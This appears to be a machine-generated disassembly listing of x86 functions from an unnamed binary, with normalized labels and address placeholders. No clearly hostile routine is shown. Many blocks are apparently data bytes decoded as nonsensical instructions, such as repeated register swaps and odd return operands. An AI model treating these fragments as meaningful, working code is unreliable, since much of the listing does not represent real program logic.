sub_48c0cd
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_48c4e0
jmp sub_403a3c
sub_48c4e7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_403a3c#8
jmp sub_403a3c
sub_48c57c
pop ebp
retn
sub_48c580
sub [ rw-data ] 0x1
retn
sub_48d0cd
push edx
ror [ ecx - 0x5 ] 0x1
retn
sub_48d5c5
push esi
add eax 0xf3050505
sbb al 0xd0
mov ch 0x7c
retn 0x95b3
sub_48dad4
retn 0xd31c
sub_48dadf
retn 0xc262
sub_48dae5
xchg ebp eax
xchg ebp eax
xchg ebp eax
add eax 0xb2a87cc5
xchg ebp eax
xchg ebp eax
add eax 0xca55a605

sub_48daf5
into
pop esp
push esi
add eax 0x5050505
sar [ edx - 0x77 ] 0x95
xchg ebp eax
add eax 0x6ac50505
retn
sub_48db5e
pop esp
push esi
add eax 0x7d050505
popfd
mov esi 0xcbca9595
into
adc [ ebp + 0x7c ] dl
mov edx [ esi + 0x5059595 ]
retn 0x2b1c
sub_48db78
push ecx
xchg ebp eax
xchg ebp eax
xchg ebp eax
sbb al 0xb
adc eax 0x7d959595
push edx
xchg edi eax
xchg ebp eax
xchg ebp eax
std
iretd
sub_48dfb3
retn 0xd97c
sub_48dfb6
xchg esi eax
xchg ebp eax
xchg ebp eax
add eax 0x1cf30505
enter 0x1ec1 0x4c
sbb al 0xc8
retn
sub_48e589
jmp esi
sub_48e8bf
retn 0x27c
sub_48ea2d
push edx
sbb al 0xd8
dec edi
int3
sub_48ec1a
jmp ebp
sub_48f45b
retn
sub_48f707
fcomp st6
push edx
sar [ ecx - 0x3d ] 0x1
fcomp st6
retn
sub_48f71c
retn
sub_48f925
push ss
push esp
xchg edi eax
retn 0x6f1e
sub_48fbf6
push ds
push edx
0x56c8
sub_48fc1d
call [ edi - 0x3b9627e8 ]
lds edi [ ebp + edi * 8 + 0x4c ]
push 0x6a
add eax 0x1cf3531e
shl [ edi + 0x1eedffcd ] 0x1
pop ebp
sbb al 0xd8
mov cl 0xcc
jmp edi
sub_48fea7
sbb al 0xc0
cmpsd [ esi ] [ edi ]
push ecx
iretd
sub_48ff03
push 0x1c
shr [ ebp + 0x6a ] 0x1
retn 0x10c1
sub_490b56
fcomp st6
push edx
sar [ ebp - 0x3d ] 0x1
fcomp st6
retn
sub_490b61
inc eax
push 0x6a
add eax 0xd0180505
imul edi [ ebp + edi * 4 + 0x6a ] 0xc3056a6a
retn 0xb57c
sub_490ff7
retn 0xd27c
sub_49114c
retn 0x36a
sub_4912c8
retn 0x6d1e
sub_491469
push 0xfffffff3
sbb al 0xd0
jae r-xdata
sbb al 0xd8
pop ecx
jge r-xdata
jmp [ edi + 0x6a699d7c ]
and [ edx + 0x6a ] ebp
int3
sub_4914b5
retn 0x36a
sub_491adc
sub [ edx + 0x6a ] ebp
int3
sub_491af6
cld
iretd
sub_491af9
sti
sbb al 0xc0

sub_491afe
iretd
sub_491f01
retn 0xe06a
sub_4922ce
push edx
shr [ 0xfffffffff0cdd8d8 ] 0x1
push edx
shr [ ecx ] 0x1
sti
retn
j_sub_403a3c#6
jmp sub_403a3c
sub_49245c
pop ebp
retn
sub_492729
jmp sub_403a3c
sub_492730
pop ecx
pop ebp
retn
j_sub_403a3c
jmp sub_403a3c
sub_4927da
pop ebp
retn
